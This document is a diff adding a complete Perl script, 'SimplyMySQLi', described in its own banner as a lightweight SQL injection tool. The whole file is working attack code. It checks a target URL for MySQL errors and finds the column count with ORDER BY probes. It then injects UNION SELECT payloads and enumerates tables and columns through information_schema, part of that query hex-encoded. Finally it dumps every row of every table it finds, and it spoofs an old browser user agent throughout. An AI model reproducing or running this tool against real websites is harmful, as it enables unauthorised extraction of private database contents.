@@ -1,0 +1,218 @@
+#!/usr/bin/perl -w
+# smsi version 0.3
+use LWP::UserAgent;
+use Term::ANSIColor;
+my ($res,$urlp,$urly,$par,$pl) = "";
+my ($cc,$vc) = 0; # column/vuln
+my @tables; # tables to loop through for columns
+my @columns; # each element table;column (2d arrays are ugly in Perl) 
+my @dataq; # data queries for logging! :D
+my $zi = " ---> "; # displaying info
+my $ze = " -!-> ";
+my $zf = " -X-> "; # Win2k 4teh forensics lulz
+my $a = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )';
+# >>> Parameter Parsing:
+foreach(@ARGV){ # grab the URL:
+	if($_ =~ m/http:/i){
+		$url = $_;
+	}
+}
+# >>> Begin Hacking:
+name(); if(!$ARGV[0]){usage();}
+verify();
+colCnt();
+servInfo(); # we now have VC/CC/DB Name!
+getTables();
+foreach(@tables){ qGetCol($_); print"\n";}
+# (print ($#tables+1) here for table count)
+foreach my $t (@tables){ 
+	print "\n" . $ze; boldG("Table: ","w"); boldG($t); print "\n\n"; qGetData($t); 
+}
+
+
+print "\n\n";
+
+sub crSubQ{ # create a sub query quickly with this.
+	$urlt = $urlT; # create a tempo our of template
+	$urlt =~ s/_0x31337_/$_[0]/;
+	query($urlt);
+	payload(); # hand us the data on a silver platter :)
+	if($rc =~ m/0x31337/){
+		if($_[1] ne 'data'){
+			print $ze . $_[1] . " " . $pl . "\n";
+		}
+		if($_[1] =~ m/Table found/){
+			push(@tables,$pl);
+			
+		}if($_[2]){
+			push(@columns,$_[2] . ";" . $pl);
+		}
+	}
+}
+sub qGetData{
+	$t = $_[0];
+	my $q = "(select concat(";
+	my $cl = "| "; # column list to display at the top
+	foreach my $c (@columns){
+		if($c =~ $t){ # table;column array
+			$c =~ s/$t;//;
+			$cl .= $c . " | ";
+			$q .= $c . ",' | ',";
+		}
+	} # print the column list:
+	print $cl . "\n<<<------------------------------------------>>>\n";
+	$q =~ s/,' \| ',$/) from $t limit 0x31337,1)/;
+	for(my $i=0;$i<=999999;$i++){
+		my $qm = $q; # query to modify
+		$qm =~ s/0x31337/$i/; # modification point
+		crSubQ($qm,'data');
+		if($pl ne '#NULL#'){
+			print $pl . "\n"; # print the payload
+		}else{
+			last;
+		}
+	}	
+
+}
+
+sub getTables{
+	my $ts = "%28%73%65%6C%65%63%74%20%54%41%42%4C%45%5F%4E%41%4D%45%20%66%"
+	. "72%6F%6D%20%28%73%65%6C%65%63%74%20%40%72%3A%3D%40%72%2B%31%20%61%73%20%6"
+	. "9%64%2C%54%41%42%4C%45%5F%4E%41%4D%45%20%66%72%6F%6D%20%28%73%65%6C%65%63"
+	. "%74%20%40%72%3A%3D%30%29%20%72%2C%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%"
+	. "63%68%65%6D%61%2E%74%61%62%6C%65%73%20%70%20%77%68%65%72%65%20%74%61%62%6"
+	. "C%65%5F%72%6F%77%73%20%3E%20%31%29%20%6B%20%77%68%65%72%65%20%69%64%20%3D"
+	. "%200x31337%29"; # 0x31337 will be for hacking with $i:
+	print "\n\n +-->>> "; boldG("Table Data","w"); print " <<<--+\n\n";
+	my $m = 1; # needs to be at least 1
+	while($rc =~ m/0x31337/){ # while returned result is worth it
+		$ts2 = $ts; # reset the sub query
+		$ts2 =~ s/0x31337/$m/; # put in my integer
+		crSubQ($ts2,'Table found:'); #
+		$m++; # go to next "1337id"
+	}
+	print "\n";
+}
+sub qGetCol{
+	my $ts = "";
+	for(my $i=1;$i<=32;$i++){
+		my $ts = "%28select%20column_name%20from%20%28select%20\@r%3A%3D\@r%"
+		."2b1%20as%201337id%2Ccolumn_name%20from%20%28select%20\@r%3A%3D0%29"
+		."%20r%2Cinformation_schema.columns%20p%20where%20table_name%20"
+		."%3D%20%27" . $_[0] . "%27%29%20k%20where%201337id%20%3D%20" . $i . "%29";
+		my $col = $_[0] . " Has column: ";
+		crSubQ($ts,$col,$_[0]);
+	}
+
+}
+sub servInfo{ # get the server info:
+	print "\n\n +-->>>"; boldG("Server Information", "w"); print " <<<--+\n\n";
+	crSubQ('user()','Current DB User:'); 
+	crSubQ('@@datadir','MySQL data directory:');
+	crSubQ('version()','MySQL version:');
+	crSubQ('connection_id()','Server connection ID:');
+}	
+sub colCnt{ # get the column count of the table
+	for($i=1;$i<33;$i++){ # 32 columns max?
+		#my $url = $urly . " order by " . $i . " --";
+		my $url = $urly . " order by " . $i . " --";
+		
+		query($url);
+		if($rc =~ m/unknown.column(.+order.clause)?/i){
+			$cc = ($i-1);
+			print $ze . "Column count: " . ($i-1) . "\n";
+			last;
+		}if($i==32){
+			print $zf . "Could not find column count.\n";
+			# TODO change this to obey to non signed Int injection
+		}
+	}
+	for($i=0;$i<$cc;$i++){ # populate @coln with NULLs:
+		push(@coln, 'NULL');
+	}
+	for($i=0;$i<$cc;$i++){ # create string query and check:
+		$coln[$i] = 'concat(\'0x31337_\',database(),\'_0x31337\')';	
+		my ($subQ,$subQ2) = "";
+		foreach(@coln){
+			$subQ .= $_ . ","; # concat(),null,null,null
+		}
+		$subQ =~ s/,$//; # remove last comma
+		$urlS = $urly . " union select " . $subQ . " --";
+		$coln[$i] = "concat(\'0x31337_\',_0x31337_,\'_0x31337\')"; 
+		foreach(@coln){ 
+			$subQ2 .= $_ . ","; 
+		}
+		$subQ2 =~ s/,$//; # remove last comma
+		$urlT = $urly . " union select " . $subQ2 . " --";
+		# HTTP GET:
+		query($urlS);
+		if($rc =~ m/0x31337_/){
+			$vc = ($i+1);
+			print $ze . "Vulnerable column: " . ($i+1) . "\n";
+			payload();
+			print $ze . "Current DB name: " . $pl . "\n";
+			last;
+		}else{
+			#print "\n" . $rc . "\n";
+		}
+		@coln = (); # empty array
+		for(my $i=0;$i<$cc;$i++){
+			push(@coln,'NULL'); # fill array with NULL again
+		}
+	}
+}
+sub payload{
+	$pl = $rc; # just pull out what we are looking for:
+	if($pl =~ m/0x31337/){
+		$pl =~ s/.*0x31337_(.+)_0x31337.*/$1/;
+	}else{
+		$pl = '#NULL#';
+	}
+}
+sub verify{ # Verify the URL and a few things first:
+	print " +-->>>"; boldG("Verification Stage","w"); print " <<<--+\n\n";
+	query($url);
+	if($res->is_success){
+		print $zi . "Host seems up and answering our prank calls\n";
+	}else{ print $zi . "The host specified seems down\n"; exit(); }
+	$urly = $urlp = $url;
+	$urly =~ s/(=|&)([0-9]+).*/$1-$2/;
+	$urlp =~ s/(=|&)([0-9]+).*/$1$2'/;
+	query($urlp);
+	if($rc =~ m/mysql.server/i){
+		print $zi . "URL Stable and DB type verified as MySQL\n";
+	}else{
+		#print $rc . "\n";
+	}
+	$par = $urlp;
+	$par =~ s/http.*(\?|&)([0-9A-Za-z_.-]+)=.+/$2/;
+	print $zi . "URL parameter to attack: " . $par . "\n"; 
+}
+sub query{ # this gets the HTML and parses it into $rc
+        # setup our HTTP request object:
+        my $ua = LWP::UserAgent->new;
+        $ua->agent($a); # $a is IE 5.5 UA
+        my $req = HTTP::Request->new(GET => $_[0]);
+        $res = $ua->request($req);
+        $rc = $res->content; # to save a few bytes ;)
+        $rc =~ tr/\r\n//d;
+}
+# Stupid Labels and colors:
+sub name{
+	print "\n  ";
+	boldG("SimplyMySQLi");
+	print " - Lightweight SQL Injection Tool\n\n";
+}
+sub usage{
+	print "  Usage: ./smsi -u '<URL>' -a <User Agent>\n  Put URL in single quotes to escape special characters from the shell.\n\n";
+	exit;
+}
+sub boldG{
+	if(($_[1]) && $_[1] eq 'w'){
+		print color 'bold white';
+	}else{
+		print color 'bold yellow';
+	}
+	print $_[0];
+	print color 'reset';
+}
